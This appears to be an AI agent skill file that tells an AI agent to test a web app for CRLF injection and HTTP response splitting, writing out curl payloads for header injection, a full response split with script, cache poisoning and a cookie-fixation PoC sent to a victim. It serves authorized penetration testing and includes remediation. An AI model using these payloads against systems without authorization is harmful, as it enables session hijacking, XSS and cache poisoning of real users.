---
name: blackbox-crlf
description: >-
  Actively test a target web application for CRLF (Carriage Return Line Feed)
  injection and HTTP Response Splitting vulnerabilities using blackbox
  techniques. Reads pentest/target-map.md, injects CRLF sequences into URL
  parameters, headers, and redirect destinations, attempts to inject arbitrary
  response headers (Set-Cookie, Location) and response body content, and
  detects successful injection via response header analysis. Writes confirmed
  findings with PoC curl commands to pentest/crlf-results.md.
---

# Blackbox CRLF Injection Detection

You are actively testing a web application for CRLF injection and HTTP Response Splitting vulnerabilities without source code access. CRLF injection allows attackers to inject arbitrary HTTP response headers, split HTTP responses, and perform XSS or cache poisoning.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## What You Are Looking For

CRLF (`\r\n` = `%0d%0a`) is the HTTP line delimiter. If user input is reflected in an HTTP response header without filtering CRLF, an attacker can inject additional headers:
- **Cookie injection**: `Set-Cookie: admin=true`
- **Cache poisoning**: Inject a `Content-Type` or cache headers
- **XSS via header injection**: Inject a body, making the browser render attacker HTML
- **Response splitting**: Completely split the HTTP response to serve arbitrary content

---

## Phase 1: Identify Injection Points

From `pentest/target-map.md`, find parameters whose values appear in HTTP **response headers** (not just the body):
- Redirect parameters (`next`, `return`, `url`, `redirect`) — often placed in `Location:` header
- Language/locale parameters (`?lang=en`) — may set `Content-Language:` header
- User-supplied values placed in `Set-Cookie` header
- Debug/trace parameters that appear in custom response headers

---

## Phase 2: CRLF Injection Testing

### Test 1: Basic CRLF in Redirect Parameter

```bash
# Inject CRLF to add a new header after Location:
curl -sk -D - -o /dev/null \
  "<TARGET_URL>/redirect?url=https://example.com%0d%0aSet-Cookie:%20admin=true"

# URL encoded variants
curl -sk -D - -o /dev/null \
  "<TARGET_URL>/redirect?url=https://example.com%0aSet-Cookie:%20admin=true"

# Double encoding
curl -sk -D - -o /dev/null \
  "<TARGET_URL>/redirect?url=https://example.com%250d%250aSet-Cookie:%20admin=true"

# Unicode CRLF
curl -sk -D - -o /dev/null \
  "<TARGET_URL>/redirect?url=https://example.com%E5%98%8DSet-Cookie:%20admin=true"
```

**Confirmed** if `Set-Cookie: admin=true` appears as a separate header in the response.

### Test 2: CRLF in URL Path

```bash
curl -sk -D - -o /dev/null \
  "<TARGET_URL>/%0d%0aSet-Cookie:admin=true"

curl -sk -D - -o /dev/null \
  "<TARGET_URL>/search%0d%0aX-Injected:test/results"
```

### Test 3: CRLF in Language/Locale Parameter

```bash
curl -sk -D - -o /dev/null \
  "<TARGET_URL>/?lang=en%0d%0aSet-Cookie:admin=1;HttpOnly=false"

curl -sk -D - -o /dev/null \
  "<TARGET_URL>/page?locale=en%0d%0aX-Custom-Header:injected"
```

### Test 4: HTTP Response Splitting

If CRLF injection works, try to inject a complete second response:

```bash
# Inject double CRLF + response body
curl -sk -D - -o /dev/null \
  "<TARGET_URL>/redirect?url=https://example.com%0d%0a%0d%0a<html><script>alert(1)</script></html>"

# Full response split
PAYLOAD="https://example.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script>"
curl -sk -D - -o /dev/null "<TARGET_URL>/redirect?url=$PAYLOAD"
```

### Test 5: CRLF for Cache Poisoning

```bash
# Inject headers to poison shared cache
curl -sk -D - -o /dev/null \
  "<TARGET_URL>/?page=home%0d%0aX-Cache-Control:max-age=99999"
```

### Test 6: CRLF in User-Agent / Referer Headers

Some apps log or reflect headers:

```bash
# User-Agent injection
curl -sk -D - -o /dev/null "<TARGET_URL>/" \
  -H "User-Agent: Mozilla%0d%0aX-Injected:from-useragent"

# Check error pages that reflect browser info
curl -sk -D - -o /dev/null "<TARGET_URL>/error" \
  -H "Referer: https://evil.com%0d%0aX-Injected:from-referer"
```

---

## Output Format

Write findings to `pentest/crlf-results.md`:

```markdown
# CRLF Injection Assessment Results

## Summary
- Parameters tested: [N]
- Confirmed CRLF Injection: [N]
- Response Splitting: [N]
- Not Vulnerable: [N]

## Findings

### [CONFIRMED] /redirect?url= — CRLF Header Injection

- **Endpoint**: `GET /redirect?url=<value>`
- **Parameter**: `url` (query string)
- **Payload**: `%0d%0aSet-Cookie:admin=true`
- **Impact**: Inject arbitrary response headers — set cookies (session fixation/privilege escalation), inject XSS via body injection, poison HTTP cache
- **Evidence**: `Set-Cookie: admin=true` appears as a standalone header in the HTTP response
- **PoC**:
  ```bash
  curl -sk -D - -o /dev/null \
    "https://target.com/redirect?url=https://example.com%0d%0aSet-Cookie:%20admin=true;%20HttpOnly=false"
  # Expected response headers:
  # HTTP/1.1 302 Found
  # Location: https://example.com
  # Set-Cookie: admin=true; HttpOnly=false   ← INJECTED
  ```
  **Cookie fixation PoC**: Send victim this URL — their browser receives the injected cookie
  `https://target.com/redirect?url=https://example.com%0d%0aSet-Cookie:session=ATTACKER_SESSION`
- **Remediation**: Validate and sanitize all user input before placing it in HTTP response headers. Strip or reject `\r`, `\n`, `%0a`, `%0d` characters from any value used in response headers.
```

---

## Important Reminders

- Modern web frameworks (Django, Rails, Express) usually handle CRLF injection automatically. Older or custom frameworks are most vulnerable.
- Test URL-encoded and double-encoded CRLF variants.
- If you find CRLF injection in a `Location:` header, immediately test for full response splitting and cookie injection.
- Clean up: write directly to `pentest/crlf-results.md`.
